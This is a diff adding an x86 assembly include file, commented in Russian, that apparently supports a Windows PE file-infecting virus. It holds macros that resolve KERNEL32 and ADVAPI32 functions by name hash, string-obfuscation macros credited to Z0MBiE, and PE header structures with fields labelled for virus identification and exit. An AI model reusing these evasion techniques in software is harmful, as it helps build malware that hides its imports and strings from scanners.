@@ -1,0 +1,346 @@
+;---------------------------------------------------------------------------
+;Макрос вызова процеруры из KERNEL32.DLL
+;
+callK32		macro progname
+    gethash progname
+    mov		ESI, zhash
+    call	find_kernel_proc
+    jz		$ + 4
+    call	EAX
+endm
+
+;---------------------------------------------------------------------------
+;Макрос возвращает адрес процедуры из KERNEL32.DLL в EAX
+GetProcAdres	macro progname
+    gethash progname
+    mov		ESI, zhash
+    call	find_kernel_proc
+endm
+
+
+;---------------------------------------------------------------------------
+;Макрос вызова процеруры из ADVAPI32.DLL
+;
+callREG		macro progname
+	x_push  EAX, ADVAPI32.DLL~
+	push    ESP
+	callK32 LoadLibraryA
+	x_pop
+    mov		EBX, [EAX.mz_peptr]
+    add 	EBX, EAX
+    gethash progname
+    mov		ESI, zhash
+    call	find_proc
+    jz		$ + 4
+    call	EAX
+endm
+
+;---------------------------------------------------------------------------
+;Макрос вызова процеруры из любой библиотеки, имя в libname
+;
+callX		macro progname, libname
+	x_push  EAX, libname~
+	push    ESP
+	callK32 LoadLibraryA
+	x_pop
+    mov		EBX, [EAX.mz_peptr]
+    add 	EBX, EAX
+    gethash progname
+    mov		ESI, zhash
+    call	find_proc
+    jz		$ + 4
+    call	EAX
+endm
+
+;---------------------------------------------------------------------------
+;Макрос вычисления хэша (by Z0MBiE http://zombie.cjb.net)
+gethash		macro   procname
+	zhash = 0
+	irpc    c, <procname>
+	zhash = ((zhash shl 7) and 0FFFFFFFFh) or (zhash shr (32-7))
+	zhash = zhash xor "&c"
+	endm
+endm
+
+;---------------------------------------------------------------------------
+;Макрос кодирования данных (by Z0MBiE http://zombie.cjb.net)
+;
+; тут в EDI будет указатель на память в которую будут складываться данные
+;
+x_stosd_first           macro
+                        _eax    = 0
+                        xor     eax, eax
+                        endm
+
+x_stosd_next            macro   t, x
+                        if      t eq 0
+                        sub     eax, _eax - x
+                        endif
+                        if      (t eq 1) or (t eq 3)
+                        xor     eax, _eax xor x
+                        endif
+                        if      t eq 2
+                        add     eax, x - _eax
+                        endif
+                        _eax = x
+                        stosd
+                        endm
+
+x_stosd                 macro   x
+                          push	EDI
+                          x_stosd_first
+                          j = 0
+                          s = 0
+                          t = 0
+                          irpc    c, <x>
+                            k = "&c"
+                            if      k eq "~"    ; zero
+                              k = 0
+                            endif
+                            if      k eq "|"    ; space
+                              k = 32
+                            endif
+                            if      k eq "ц"    ; cr
+                              k = 13
+                            endif
+                            if      k eq "ч"    ; lf
+                              k = 10
+                            endif
+                            j = j + k shl s
+                            s = s + 8
+                            if s eq 32
+                              x_stosd_next t,j
+                              t = t + 1
+                              if t eq 4
+                                t = 0
+                              endif
+                              j = 0
+                              s = 0
+                            endif   ; i eq 4
+                          endm    ; irpc
+                          if s ne 0
+                            j = (j + 12345678h shl s) and 0ffffffffh
+                            x_stosd_next t,j
+                          endif
+                        pop		EDI
+                        endm    ; x_stosd
+
+x_pop                   macro
+                        lea     esp, [esp + _xsize]
+                        endm
+
+
+;---------------------------------------------------------------------------
+;Макрос кодирования данных (by Z0MBiE http://zombie.cjb.net)
+;
+; тут данные будут складываться в стэк
+;
+
+x_push_first            macro   r
+                        xor     r, r
+                        _reg = 0
+                        endm
+
+x_push_next             macro   q, r, x
+                        if q eq 0
+                        sub     r, _reg - x
+                        endif
+                        if (q eq 1) or (q eq 3)
+                        xor     r, _reg xor x
+                        endif
+                        if q eq 2
+                        add     r, x - _reg
+                        endif
+                        push    r
+                        _reg = x
+                        endm
+
+x_push                  macro   r, x
+                        x_push_first r
+                        _xsize = 0
+                        l       = 0
+                        irpc    c, <x>
+                        l       = l + 1
+                        endm
+                        j = 0
+                        s = 0
+                        l0 = l
+                        if (l0 and 3) ne 0
+                        j = j shl 8 + "x"
+                        s = s + 8
+                        l0 = l0 + 1
+                        endif
+                        if (l0 and 3) ne 0
+                        j = j shl 8 + "y"
+                        s = s + 8
+                        l0 = l0 + 1
+                        endif
+                        if (l0 and 3) ne 0
+                        j = j shl 8 + "z"
+                        s = s + 8
+                        l0 = l0 + 1
+                        endif
+                        q = 0
+                        i       = l - 1
+                        irpc    c1, <x>
+                          t       = 0
+                          irpc    c, <x>
+                            k = "&c"
+                            if      k eq "~"    ; zero
+                              k = 0
+                            endif
+                            if      k eq "|"    ; space
+                              k = 32
+                            endif
+                            if      k eq "ц"    ; cr
+                              k = 13
+                            endif
+                            if      k eq "ч"    ; lf
+                              k = 10
+                            endif
+                            if t eq i
+                              j = j shl 8
+                              if k ne 0
+                              j = j + k
+                              endif
+                              s = s + 8
+                              if s eq 32
+                                _xsize = _xsize + 4
+                                x_push_next q,r,j
+                                q = q + 1
+                                if q eq 4
+                                  q = 0
+                                endif
+                                s = 0
+                                j = 0
+                              endif
+                              exitm
+                            endif
+                            t     = t + 1
+                          endm l irpc
+                          i = i - 1
+                        endm ; irpc
+                        if s ne 0
+                          error
+                        endif
+                        endm ; x_push
+
+x_pop                   macro
+                        lea     esp, [esp + _xsize]
+                        endm
+
+                        ;-------------------------------------------------------------
+; FIND структура
+ff_struc	struc
+ff_attr                 dd ?
+ff_create_time          dd ?
+                        dd ?
+ff_last_access_time     dd ?
+                        dd ?
+ff_last_write_time      dd ?
+                        dd ?
+ff_file_size_high       dd ?
+ff_file_size_low        dd ?
+ff_reserved             dd ?
+                        dd ?
+ff_fullname             db 260 dup (?)
+ff_dosname              db 14 dup (?)
+ff_struc	ends
+
+; MZ заголовок
+mz_struc        struc
+mz_id                   dw      ?     ; +00h MZ/ZM
+mz_last512              dw      ?     ; +02h длина последней страницы
+mz_num512               dw      ?     ; +04h длина файла в страницах
+mz_relnum               dw      ?     ; +06h число элементов в таблице настроек адресов
+mz_hdrsize              dw      ?     ; +08h длина заголовка в параграфах
+mz_minmem               dw      ?     ; +0Ah минимум памяти
+mz_maxmem               dw      ?     ; +0Ch максимум памяти
+mz_ss                   dw      ?     ; +0Eh SS
+mz_sp                   dw      ?     ; +10h SP
+mz_csum                 dw      ?     ; +12h контрольная сумма
+mz_ip                   dw      ?     ; +14h IP
+mz_cs                   dw      ?     ; +16h CS
+mz_relptr               dw      ?     ; +18h физическое смещение 1го элемента таблицы настройки адресов
+mz_ovrnum               dw      ?     ; +1Ah номер оверлея
+                        db 32 dup (?) ; +1Ch кал
+mz_peptr                dd      ?     ; +3Ch смещение NE/PE заголовка
+                ends
+
+; PE
+pe_struc        struc
+pe_id                   dd      ?     ; +00h PE сигнатура
+pe_cputype              dw      ?     ; +04h
+pe_numofobjects         dw      ?     ; +06h количество об'ектов
+pe_datetime             dd      ?     ; +08h
+pe_cofftableptr         dd      ?     ; +0Ch
+pe_cofftablesize        dd      ?     ; +10h
+pe_ntheadersize         dw      ?     ; +14h размер заголовка со смещения +18h
+pe_exeflags             dw      ?     ; +16h
+pe_ntheader_id          dw      ?     ; +18h
+pe_virusid_small        dw      ?     ; +1Ah идентификация вируса упрощённая :)
+pe_sizeofcode           dd      ?     ; +1Ch размер выполняемого кода
+pe_sizeofinitdata       dd      ?     ; +20h
+pe_sizeofuninitdata     dd      ?     ; +24h
+pe_entrypointrva        dd      ?     ; +28h точка входа RVA
+pe_baseofcoderva        dd      ?     ; +2Ch
+pe_baseofdatarva        dd      ?     ; +30h
+pe_imagebase            dd      ?     ; +34h Image Base
+pe_objectalign          dd      ?     ; +38h выравнивание секций в памяти
+pe_filealign            dd      ?     ; +3Ch выравнивание секций в файле
+pe_osmajor              dw      ?     ; +40h
+pe_osminor              dw      ?     ; +42h
+pe_virusid              dd      ?     ; +44h идентификация вируса :)
+pe_subsysmajor          dw      ?     ; +48h
+pe_subsysminor          dw      ?     ; +4Ah
+pe_virusexit			dd      ?     ; +4Ch
+pe_imagesize            dd      ?     ; +50h виртуальный размер кода
+pe_headersize           dd      ?     ; +54h
+pe_checksum             dd      ?     ; +58h
+pe_subsystem            dw      ?     ; +5Ch
+pe_dllflags             dw      ?     ; +5Eh
+pe_stackreservesize     dd      ?     ; +60h
+pe_stackcommitsize      dd      ?     ; +64h
+pe_heapreservesize      dd      ?     ; +68h
+pe_heapcommitsize       dd      ?     ; +6Ch отводимая при загрузке куча
+pe_loaderflags          dd      ?     ; +70h
+pe_numofrvaandsizes     dd      ?     ; +74h
+pe_exporttablerva       dd      ?     ; +78h
+pe_exporttablesize      dd      ?     ; +7Ch
+pe_importtablerva       dd      ?     ; +80h
+pe_importtablesize      dd      ?     ; +84h
+pe_resourcetablerva     dd      ?     ; +88h
+pe_resourcetablesize    dd      ?     ; +8Ch
+pe_exceptiontablerva    dd      ?     ; +90h
+pe_exceptiontablesize   dd      ?     ; +94h
+pe_securitytablerva     dd      ?     ; +98h
+pe_securitytablesize    dd      ?     ; +9Ch
+pe_fixuptablerva        dd      ?     ; +A0h
+pe_fixuptablesize       dd      ?     ; +A4h
+pe_debugtablerva        dd      ?     ; +A8h
+pe_debugtablesize       dd      ?     ; +ACh
+pe_imgdescrrva          dd      ?     ; +B0h
+pe_imgdescrsize         dd      ?     ; +B4h
+pe_machinerva           dd      ?     ; +B8h
+pe_machinesize          dd      ?     ; +BCh
+pe_tlsrva               dd      ?     ; +C0h
+pe_tlssize              dd      ?     ; +C4h
+pe_loadcfgrva           dd      ?     ; +C8h
+pe_loadcfgsize          dd      ?     ; +CCh
+                        dq      ?     ; +D0h
+pe_iattablerva          dd      ?     ; +D8h
+pe_iattablesize         dd      ?     ; +DCh
+                        dq      ?     ; +E0h
+                        dq      ?     ; +E8h
+                        dq      ?     ; +F0h
+                ends
+
+object_struc    struc
+Object              db 08h DUP (?)
+OBJVsize            dd ?
+OBJRVA              dd ?
+OBJPsize            dd ?
+OBJPoff             dd ?
+                    db 0ch DUP (?)
+OBJFlags            dd ?
+        ends
